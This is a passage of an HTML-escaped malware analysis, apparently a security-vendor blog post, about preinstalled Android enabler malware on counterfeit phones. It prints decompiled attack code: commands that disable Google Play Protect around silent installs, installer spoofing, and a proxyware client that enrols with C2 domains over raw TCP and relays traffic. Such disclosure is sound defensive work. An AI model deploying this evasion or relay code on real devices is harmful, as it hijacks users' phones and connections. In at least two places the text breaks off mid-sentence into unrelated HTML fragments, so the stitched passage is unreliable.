permission:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E\u002F\u002F com.dmstudio.weather  q6\u002Fc.java:17  (uses a permission a store app cannot obtain) \nSettings.Global.putString(cr, \"vdgtjy\", {\"data\":&lt;int&gt;,\"time\":&lt;millis&gt;}); \n\u002F\u002F grantable only because a GRANT_RUNTIME_PERMISSIONS holder granted it (development-flag perm): \n\u002F\u002F enabler\u002Fplugins: grantRuntimePermission pkg:  ... authorize, grantRuntimePermissionFor6X\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003EThe weather app's working WRITE_SECURE_SETTINGS write indicates it received a privileged grant it could never obtain from a normal install, which is consistent with the system-uid enabler granting it. The same package is also published on Google Play, in a build that holds no such grant. The privilege comes from how the application arrived on the device, not from the application itself.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003EInteraction with the system app: the dropped cover apps are bound peers in an ad mesh. They export MyDataService (action com.media.am.intent.action.BIND_SERVICE); a controller binds them and pushes ad commands (initMediaApp\u002FsetAdData\u002FtransferData) and they share the same uuid and weatherlive C2.\u003C\u002Fp\u003E\u003Ch2 id=\"play-protect-evasion-disable-%E2%86%92-install-%E2%86%92-re-enable\"\u003EPlay Protect evasion (disable → install → re-enable)\u003C\u002Fh2\u003E\u003Cp\u003EBeyond suppressing the install prompt, the plugins blind Google Play Protect for the duration of the install. Using the host’s system-uid shell access, they run ‘pm disable com.android.vending’ (the Play Store, which hosts Play Protect’s on-device scanner) immediately before installing the partner APK, then ‘pm enable com.android.vending’ in both the success and failure install callbacks\u003C\u002Fp\u003E\u003Cp\u003EThe malicious install happens in a window where Google’s scanner is switched off. All three plugins implement it identically (obfuscated strings decrypt to the commands shown):\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E\u002F\u002F com.earnsdk.lib.AppInstallHelper.c()  (also com.gogo.third \u002F com.wz.sdk) \nearndex.e.a.a(context, \"com.android.vending\");   \u002F\u002F -&gt; pm disable com.android.vending   (before install) \nf.g(context, pkg, apkPath);                       \u002F\u002F    silent PackageInstaller session \n\u002F\u002F install observer: \nonSuccess -&gt; earndex.e.a.b(\"com.android.vending\"); \u002F\u002F -&gt; pm enable com.android.vending \nonFailure -&gt; earndex.e.a.b(\"com.android.vending\"); \u002F\u002F -&gt; pm enable com.android.vending \n\n\u002F\u002F earndex.e.a  (bldex.e.a \u002F com.ads.cal.core in the other plugins) \na(ctx,p): f.e({ \"pm disable \" + p });   \u002F\u002F ProcessBuilder \nb(p):     f.e({ \"pm enable \"  + p });   \u002F\u002F ProcessBuilder\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003EPlay Protect evasion, confirmed across all three plugins (earn: earndex\u002Fe\u002Fa.java; gogo: bldex\u002Fe\u002Fa.java; wz: com\u002Fads\u002Fcal\u002Fcore\u002Fkt\u002FContextKtKt + GEMController). The obfuscated tokens decrypt to ‘pm disable ’, ‘pm enable ’ and ‘com.android.vending’. This is distinct from the silent install itself: the silent install removes the user prompt; disabling com.android.vending removes real-time detection.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Ch2 id=\"forged-play-provenance-%E2%80%93-spoofed-installer-absent-frosting\"\u003EForged Play provenance – spoofed installer, absent frosting\u003C\u002Fh2\u003E\u003Cp\u003EDisabling the scanner conceals the install while it happens. A second technique conceals it afterwards, by rewriting where the app claims to have come from.\u003C\u002Fp\u003E\u003Cp\u003EA privileged installer holding \u003Cstrong\u003EINSTALL_PACKAGES\u003C\u002Fstrong\u003E sets the recorded installer package itself, through \u003Cstrong\u003EPackageInstaller.SessionParams\u003C\u002Fstrong\u003E. The platform does not validate the value; it is whatever the installing process declares. On part of the corpus it is set to \u003Cstrong\u003Ecom.android.vending\u003C\u002Fstrong\u003E, so the device reports the app as sourced from Google Play.\u003C\u002Fp\u003E\u003Cp\u003EThe claim is falsifiable. Apps actually distributed through Google Play carry a Play-applied signature block called \u003Cem\u003Efrosting\u003C\u002Fem\u003E, that is added server-side by Google as proof the APK passed through Play, and it cannot be produced off-platform. Where the installer field says \u003Cstrong\u003Ecom.android.vending\u003C\u002Fstrong\u003E but no frosting block is present, the provenance is fabricated rather than earned:\u003C\u002Fp\u003E\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth\u003EMD5\u003C\u002Fth\u003E\n\u003Cth\u003EPackage\u003C\u002Fth\u003E\n\u003Cth\u003EInstaller recorded\u003C\u002Fth\u003E\n\u003Cth\u003EPlay frosting\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E\u003Ccode\u003E0903d7fd3e1d4a599a7eb3c5d356779b\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecom.android.weiapps\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecom.android.vending\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003EAbsent\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E\u003Ccode\u003E61aac6a98abd6dcff0dc41bb88159786\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecom.android.sys.dts\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecom.android.vending\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003EAbsent\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E\u003Ccode\u003E250205ee4b8de59e60c745856f439608\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecom.android.non.szcz\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecom.android.vending\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003EAbsent\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\n\u003C\u002Ftable\u003E\n\u003Cp\u003E\u003Cem\u003ESamples recording Google Play as their install source while carrying no Play signature block. All three are enabler-family builds, not dropped payloads.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003EThis inverts the usual triage shortcut. Suppressing the install prompt removes the user, disabling \u003Cstrong\u003Ecom.android.vending\u003C\u002Fstrong\u003E removes the automated scanner, spoofing the installer name removes the forensic trail that would show either happened. In this campaign, the installer field can’t be used on its own to attribute a sample or to clear one, frosting presence or absence is the reliable check.\u003C\u002Fp\u003E\u003Ch2 id=\"delivery-model-and-field-insights\"\u003EDelivery model and field insights\u003C\u002Fh2\u003E\u003Cp\u003EThe partner APK is not fetched separately at install time. It’s actually bundled inside the stage-3 plugin as assets\u002Fmediaapp-release.apk. The C2 controls which APK is delivered by controlling which plugin version it serves (getConfigs version → plugin pulled from CDN oss.showtimetool[.]com). The two partner APKs found bundled are byte-identical to known standalone dropper style=\"text-align:right\"\u003E1\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\n\u003C\u002Ftable\u003E\n\u003Cp\u003E\u003Cem\u003EPackages recorded as installed by com.android.system.lite. Both the no-icon droppers and the functional cover apps are installed by the enabler; multiple distinct APK versions per package reflect C2 version rotation of the bundled payload.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Ch2 id=\"campaign-scale\"\u003ECampaign scale\u003C\u002Fh2\u003E\u003Cp\u003EThe table above counts a single studied enabler's installed portfolio. Measured across the family as a whole, over a roughly two-year window, the campaign was observed on thousands of unique devices across more than 150 countries.&nbsp;\u003C\u002Fp\u003E\u003Cp\u003EThe geographic distribution is led by Mexico, France and Italy, followed by the United States, Germany, Brazil and Spain. Below the top, there’s a long tail across Africa, Southeast Asia and the Middle East.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F10\u002FPicture4.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"2000\" height=\"1128\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F10\u002FPicture4.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F10\u002FPicture4.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1600\u002F2026\u002F10\u002FPicture4.png 1600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F10\u002FPicture4.png 2145w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cem class=\"italic\" style=\"white-space: pre-wrap;\"\u003EShare of observed devices by country. Detections were recorded in more than 150 countries.\u003C\u002Fem\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe chart has two features of that spread that are worth highlighting. No single country is dominant, and the weight sits in two separate regional centers of gravity—Western Europe and the Americas—rather than one.\u003C\u002Fp\u003E\u003Cp\u003ENeither is what a regional distribution channel looks like; a carrier or a national retailer produces one dominant market. Two centers with a long tail behind them is what hardware moving through international online marketplaces looks like.\u003C\u002Fp\u003E\u003Cp\u003EWe also have some details on the types of devices that carry this malware. Many devices are identified simply by the firmware they use and are likely cheap devices or clones of better-known ones.\u003C\u002Fp\u003E\u003Cp\u003E\u003Ca\u003EAs we mentioned earlier, Zediel-signed firmware is not the only way malware is shipped. The operators use many other devices, most of them likely visual clones of real phones, to embed the same malware.\u003C\u002Fa\u003E\u003C\u002Fp\u003E\u003Cp\u003E\u003Ca\u003EBeyond the generic user agent strings, many of the affected models are counterfeit devices that borrow flagship names they have nothing to do with. Fake iPhones include: \"i17 Pro Max\", \"i16_Pro_Max\", or \"17_Pro_Max\", and an \"iPadAirPro\" for the tablet line.\u003C\u002Fa\u003E\u003C\u002Fp\u003E\u003Cp\u003ESamsung's Galaxy is copied just as freely, with free-text \"S25 Ultra\", \"S24 Ultra\", or \"Note 18 Ultra\" strings that a genuine unit would never report; the campaign even spoofs the real codes, so \"SM-S938B\", a legitimate-looking user agent string for the Galaxy S25 Ultra, appears on devices that aren't Samsung.\u003C\u002Fp\u003E\u003Cp\u003EHonor's Magic 15 MAX and a crop of no-name \"Ultra\" handsets round out the pattern. The same firmware ships under whatever prestige name sells a cheap phone, which is why the model column is a spoofing indicator, not a real device inventory.\u003C\u002Fp\u003E\u003Cp\u003EThe two highest-volume models, by contrast, are genuine, named brands: \"S200 X\" is associated with Doogee and \"KINGKONG X\" is associated with Cubot. These brand names also appeared in a publicly reported firmware-update incident documented on the XDA forum, which may indicate a broader pattern in certain segments of the supply chain.\u003C\u002Fp\u003E\u003Cp\u003EThe public report can be found on \u003Ca href=\"https:\u002F\u002Fxdaforums.com\u002Ft\u002Fneed-help-identifying-com-android-sys-extplv-google-play-installed-package-on-cubot-kingkong-x.4793574\u002F\"\u003EXDA forum\u003C\u002Fa\u003E in which owners traced a hidden com.android.sys.* package that reappeared under a new name after removal, the same self-updating behavior seen in this family.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F10\u002FPicture5.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"2000\" height=\"1307\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F10\u002FPicture5.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F10\u002FPicture5.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1600\u002F2026\u002F10\u002FPicture5.png 1600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F10\u002FPicture5.png 2145w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Ch2 id=\"proxyware-botnet-commobileapplocken\"\u003EProxyware botnet (com.mobile.applock.en)\u003C\u002Fh2\u003E\u003Cp\u003EThe partner app bundled in the earn plugin (com.mobile.applock.en, label “Locket”, a no-icon fake app-lock) is a single-purpose TCP back-connect proxy.\u003C\u002Fp\u003E\u003Cp\u003EIt enrolls the device as a remotely controlled relay node. It declares only INTERNET and ACCESS_NETWORK_STATE and contains no ads, no UI, and no dynamic code loading. The loader identifies itself as “EnLoaderLib” v1.0.6. Four code sites implement the full node lifecycle: enroll, command, tunnel, relay.\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EEnroll: each device registers with the C2 as a node:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E\u002F\u002F h\u002Fi.java \nString uuid = new h(i.this.m).a().toString();       \u002F\u002F per-device UUID \njSONObject.put(\"os\",  \"android\"); \njSONObject.put(\"uuid\", this.l);                       \u002F\u002F node id \njSONObject.put(\"is\",  this.f192e);                    \u002F\u002F product\u002Fcampaign id \njSONObject.put(\"v\",   \"v1.0.6\");                      \u002F\u002F EnLoaderLib version \njSONObject.put(\"inf\", a2);                            \u002F\u002F device fingerprint \n\u002F\u002F h\u002Fg.java  — the fingerprint reported: \nBuild.MODEL +\"#*#\"+ Build.VERSION.RELEASE +\"#*#\"+ Build.VERSION.SDK_INT +\"#*#\"+ Build.ID +\"#*#\"+ Build.BRAND;\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cstrong\u003ECommand channel: a raw TCP socket to the control host (not HTTP):\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E\u002F\u002F h\u002Fk.java \nSocket socket = new Socket(); \nsocket.connect(new InetSocketAddress(split[0], Integer.parseInt(split[1])), 40000); \n\u002F\u002F control host built in h\u002Fi.java: \nString.format(\"%s.%s.%s:6000\", productId, \"apple\", domainPool[nextInt]);   \u002F\u002F raw TCP :6000 \ndomainPool = {\"0aa0cf0637d66c0d[.]com\",\"aa86a52a98162b7d[.]com\",\"442fe7151fb1e9b5[.]com\",\"v46wd6uramzkmeeo[.]in\"};\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cstrong\u003ECommand loop: the C2 pushes a list of targets and the device opens a tunnel to each and re-polls on a schedule:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E\u002F\u002F h\u002Fi.java \nJSONObject o = new JSONObject(str); \nJSONArray  s = o.getJSONArray(\"s\");                   \u002F\u002F \"s\" = array of \"host,port\" targets \nfor (int i = 0; i &lt; s.length(); i++) { \n    String[] split = ((String) s.get(i)).split(\",\");  \u002F\u002F \"host,port\" \n    i.this.t(split[0], split[1], optInt3, optInt2, optString);   \u002F\u002F spawn a tunnel per target \n} \nint t = o.optInt(\"t\", 0); \nif (t &gt; 0) f191d.scheduleAtFixedRate(new a(), t, t, TimeUnit.MINUTES);   \u002F\u002F periodic re-poll\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cstrong\u003ERelay pump: bytes are piped verbatim between the C2 side and the target (the proxy exit):\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E\u002F\u002F h\u002Fm.java  — d.run() opens two sockets and wires both directions: \nsocket.connect(new InetSocketAddress(nVar.f231c, nVar.f232d), 5000);   \u002F\u002F C2 \u002F relay coordinator \nsocket2.connect(mVar.f(str, str2, i), 5000);                           \u002F\u002F the target host:port \nexecute(new a(socket, socket2));  execute(new b(socket2, socket));     \u002F\u002F full-duplex relay \n\npublic final void m(Socket socket, Socket socket2) {                   \u002F\u002F the byte pump \n    h.d b2 = l.b(l.g(socket));    \u002F\u002F source \n    h.c a2 = l.a(l.d(socket2));   \u002F\u002F sink \n    while (!b2.e()) { \n        long d2 = b2.d(bVar, 8192L);          \u002F\u002F read up to 8KB from one socket \n        if (d2 &gt; 0) { a2.b(bVar, d2); a2.flush(); }   \u002F\u002F write straight to the other \n    } \n}\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003EEnroll → command → tunnel → relay (h\u002Fi, h\u002Fk, h\u002Fm, h\u002Fg). A central controller, enrolled nodes keyed by UUID\u002Fproduct id, remotely-supplied host:port targets, and a bidirectional byte relay: the victim’s connectivity is monetised as a residential-proxy exit node, and can reach arbitrary hosts including the local network.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003EDynamic verification confirms the control infrastructure is live. On execution, the client resolves a control host via wildcard DNS and completes a TCP connection to it on port 6000, transmitting the registration record; the control host rotates across the four domains on successive attempts:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Econtrol host : OeawmFEDPClEAiH9.apple.0aa0cf0637d66c0d[.]com:6000   -&gt;  85.17.70.38:6000 \nregistration : {\"os\":\"android\",\"uuid\":\"&lt;node&gt;\",\"is\":\"OeawmFEDPClEAiH9\",\"v\":\"v1.0.6\", \n                \"inf\":\"&lt;device-fingerprint&gt;\",\"n\":\"t\"} \nresponse     : (empty — no relay targets returned to a freshly-enrolled node) \nrotation     : next attempt -&gt; OeawmFEDPClEAiH9.apple.442fe7151fb1e9b5[.]com:6000\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003EThe control server 85.17.70.38:6000 (reached through the wildcard-DNS domains) is live and accepts node enrolment. A freshly-enrolled node received no relay targets in this observation; no traffic was relayed.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003E\u003Cem\u003EErratum: A second look at this IP revealed that it was in fact a sinkhole and not a C2 server. Investigating the C2 servers for the payloads is outside the scope of this investigation since the payloads themselves are not new, only the delivery mechanism merits attention.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003EThe second bundled partner (\u003Cstrong\u003Ecom.mobile.applock.wt\u003C\u002Fstrong\u003E) is the same no-icon fake app-lock shell with a different payload: an ad-fraud module (com.ctr.cbd) that reflectively loads remote DEX ad modules. The enabler therefore delivers both a proxyware and an ad-fraud dropper, selected by which plugin the C2 serves.\u003C\u002Fp\u003E\u003Ch2 id=\"c2-infrastructure\"\u003EC2 infrastructure\u003C\u002Fh2\u003E\u003Cp\u003ETwo HTTPS channels to api.weatherlive.world, both AES-encrypted with HmacMD5-signed requests. The command channel (getConfigs) decrypts to a device-fingerprint request and a module-control response:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003EPOST https:\u002F\u002Fapi.weatherlive[.]world\u002Fbr_upgrade\u002FupgradeV2\u002FgetConfigs \nheaders: App-Id: 20240425 | api-id | nonce | timestamp | signature(HmacMD5) \n\ndevice SENDS (AES\u002FECB\u002FPKCS5, decrypted): \n  {\"imei\":..,\"androidId\":..,\"mac\":..,\"simCode\":\"CN\",\"channelId\":\"20240425\",\"timezone\":..} \n\nC2 RETURNS (AES\u002FCBC\u002FPKCS5, decrypted) — remote module control plane: \n  {\"list\":[{\"sdkName\":\"wz\",\"status\":1,\"updateStatus\":1,\"version\":20311}, \n           {\"sdkName\":\"earn\",...,\"version\":5}, \n           {\"sdkName\":\"bl\",...,\"version\":10014}]} \n  per-module: {\"size\":\"20311\",\"iconDesc\":\"1782294f...\",\"warningIcon\":\"https:\u002F\u002Foss.showtimetool[.]com\u002F...png\"}\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Cem\u003EThe getConfigs control channel dictates which plugins run, at which version, and where to fetch them (warningIcon URL, keyed by iconDesc md5). The telemetry beacon \u002Fodborwer_dot\u002Fcm returns only a fixed ack {\"a\":0}.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003EModule download URLs (from decrypted config; served as .png on the CDN):\u003C\u002Fp\u003E\u003Cul\u003E\n\u003Cli\u003Ewz (v20311) hxxps:\u002F\u002Foss[.]showtimetool[.]com\u002Fssc\u002F2026\u002F08-13\u002F[REDACTED].png\u003C\u002Fli\u003E\n\u003Cli\u003Ekwlib (v100007) hxxps:\u002F\u002Foss[.]showtimetool[.]com\u002Fssc\u002F2026\u002F07-04\u002F[REDACTED].png\u003C\u002Fli\u003E\n\u003Cli\u003Egogo (v10014) hxxps:\u002F\u002Foss[.]showtimetool[.]com\u002Fssc\u002F2026\u002F03-09\u002F[REDACTED].png\u003C\u002Fli\u003E\n\u003Cli\u003Eearn (v5) hxxps:\u002F\u002Foss[.]showtimetool[.]com\u002Fssc\u002F2025\u002F12-07\u002F[REDACTED].png\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch2 id=\"related-samples-%E2%80%94-the-enabler-is-a-multi-name-family\"\u003ERelated samples — the enabler is a multi-name family\u003C\u002Fh2\u003E\u003Cp\u003EA manifest-similarity query surfaced other fake-system applications. Because AOSP-disguised apps share manifest structure, candidates were confirmed by hard family markers rather than manifest score: presence of the native core (libeasy.so, or a renamed variant), the RC4-dropped framework namespace cn.kw.lib, the C2 api.weatherlive.world, the Accessibility hook, and the distinctive versionCode 900000+ scheme. \u003C\u002Fp\u003E\u003Cp\u003EThe enabler is not a single package: the same core ships under several ‘system’ names.\u003C\u002Fp\u003E\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth\u003ESample (MD5)\u003C\u002Fth\u003E\n\u003Cth\u003EPackage (versionCode)\u003C\u002Fth\u003E\n\u003Cth\u003EConfirming markers\u003C\u002Fth\u003E\n\u003Cth\u003EVerdict\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E\u003Ccode\u003Eb862681953e945439167a736ba4cd41b\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecom.android.system.lite\u003C\u002Fcode\u003E (900000)\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Ccode\u003Elibeasy.so\u003C\u002Fcode\u003E, \u003Ccode\u003Eapi.weatherlive.world\u003C\u002Fcode\u003E, \u003Ccode\u003EMonitorAccessibility\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Cstrong\u003ESame family\u003C\u002Fstrong\u003E — sibling build of this enabler, using a different signing certificate\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E\u003Ccode\u003Ed4ceb05682ecd60f4ebb4e76e02fcf7d\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecom.android.sys.prot\u003C\u002Fcode\u003E (900014)\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecn.kw.lib\u003C\u002Fcode\u003E, \u003Ccode\u003Eapi.weatherlive.world\u003C\u002Fcode\u003E, \u003Ccode\u003EMonitorAccessibility\u003C\u002Fcode\u003E; native core renamed to \u003Ccode\u003Elibunionprt.so\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Cstrong\u003ESame family\u003C\u002Fstrong\u003E — variant enabler\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd\u003E\u003Ccode\u003E2b784622422f4280e0b3e38b30dd87bc\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Ccode\u003Ecom.android.sys.gmsprot\u003C\u002Fcode\u003E (100000)\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Ccode\u003Elibeasy.so\u003C\u002Fcode\u003E, \u003Ccode\u003Ecn.kw.lib\u003C\u002Fcode\u003E, \u003Ccode\u003Eapi.weatherlive.world\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd\u003E\u003Cstrong\u003ESame family\u003C\u002Fstrong\u003E — variant enabler\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\n\u003C\u002Ftable\u003E\n\u003Cp\u003E\u003Cem\u003EConfirmed by binary analysis. The com.android.system.lite \u002F com.android.sys.* cluster (versionCode 900000+, ‘system’\u002F‘sys’ naming) is one enabler family sharing the libeasy \u002F cn.kw.lib core and the weatherlive C2.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Ch2 id=\"why-shenzhen-zediel-co-ltd\"\u003EWhy Shenzhen Zediel Co., Ltd.\u003C\u002Fh2\u003E\u003Cp\u003EThe enabler&nbsp;\u003Ccode\u003Ecom.android.system.lite\u003C\u002Fcode\u003E&nbsp;is signed with platform-key cert&nbsp;\u003Ccode\u003E0105bc4c…\u003C\u002Fcode\u003E&nbsp;(DN&nbsp;\u003Ccode\u003ECN=ZED, O=ZED, L=ShenZhen, C=CN, ZED@Zediel.com\u003C\u002Fcode\u003E). This maps to a real Shenzhen Android OEM\u002Ftablet maker,&nbsp;\u003Cstrong\u003EShenzhen Zediel Co., Ltd.\u003C\u002Fstrong\u003E, which holds an IEEE MAC allocation:\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EMAC OUI&nbsp;\u003Ccode\u003EA0:53:94\u003C\u002Fcode\u003E\u003C\u002Fstrong\u003E&nbsp;(MA-L block, registered&nbsp;\u003Cstrong\u003E2021-11-03\u003C\u002Fstrong\u003E) →&nbsp;\u003Cstrong\u003Edevice-level IOC.\u003C\u002Fstrong\u003E&nbsp;Any device whose Wi‑Fi MAC starts with&nbsp;\u003Ccode\u003EA0:53:94\u003C\u002Fcode\u003E&nbsp;is \u003Ca href=\"https:\u002F\u002Fuic.io\u002Fen\u002Fmac\u002Fvendor\u002Fshenzhen_zediel_co_ltd\u002F\"\u003Ea Zediel build\u003C\u002Fa\u003E — usable to hunt&nbsp;\u003Cstrong\u003Eall affected devices in telemetry regardless of installed payloads\u003C\u002Fstrong\u003E, and to estimate true fleet size.\u003C\u002Fp\u003E\u003Cp\u003EThe device models seen in telemetry corroborate this independently. The model strings reported by affected devices point overwhelmingly to low-cost, white-label handsets, in two distinct patterns.\u003C\u002Fp\u003E\u003Cp\u003EThe first is region-coded firmware strings, where the _EEA and _US suffixes are the regional build markers typical of no-name ODM devices, alongside raw board support package names. A board name surfacing as the product model is not something a user-installed app produces. It appears when the component ships inside the vendor firmware image.\u003C\u002Fp\u003E\u003Cp\u003EThe second is counterfeit flagship naming. style=\"font-family:&quot;Aptos&quot;,sans-serif\"\u003Eorg.life.goal.tools\u003C\u002Fspan\u003E\u003Co:p\u003E\u003C\u002Fo:p\u003E\u003C\u002Fp\u003E\n  \u003C\u002Ftd\u003E\n \u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\u003C\u002Ftable\u003E\n\u003C!--kg-card-end: html--\u003E\n\u003Cp\u003E\u003Cem\u003EApplications published on Google Play carrying ad-fraud family markers.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003EThese are genuine Play builds. They carry the Play signature block whose absence identified the spoofed installs earlier in this report. The provenance is real, which means these applications passed Play review and were distributed by Google to users who went looking for a weather app or a QR scanner. No counterfeit hardware is involved.\u003C\u002Fp\u003E\u003Cp\u003EThe signing identities rotate deliberately. Thirteen packages carry 13 different signing certificates, spread across at least two developer accounts, fivedev and CPS Developer, with the remainder unresolved.\u003C\u002Fp\u003E\u003Cp\u003EThe link between them is the shared code, not the certificate. An actor who rotates signing identity per package is anticipating that any one of them will eventually be burned.\u003C\u002Fp\u003E\u003Cp\u003EWhile they do provide functionality, they also load and display ads outside the app, sometimes even when the user isn't even using the phone.\u003C\u002Fp\u003E\u003Cp\u003EThis is an example of one of the applications listed in the Google Play Store that communicates with same servers and the embedded malware.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F10\u002FCoolWeather-cps-Contains-ads-100K--Downl.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1465\" height=\"987\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F10\u002FCoolWeather-cps-Contains-ads-100K--Downl.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F10\u002FCoolWeather-cps-Contains-ads-100K--Downl.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F10\u002FCoolWeather-cps-Contains-ads-100K--Downl.png 1465w\" sizes=\"(min-width: 720px) 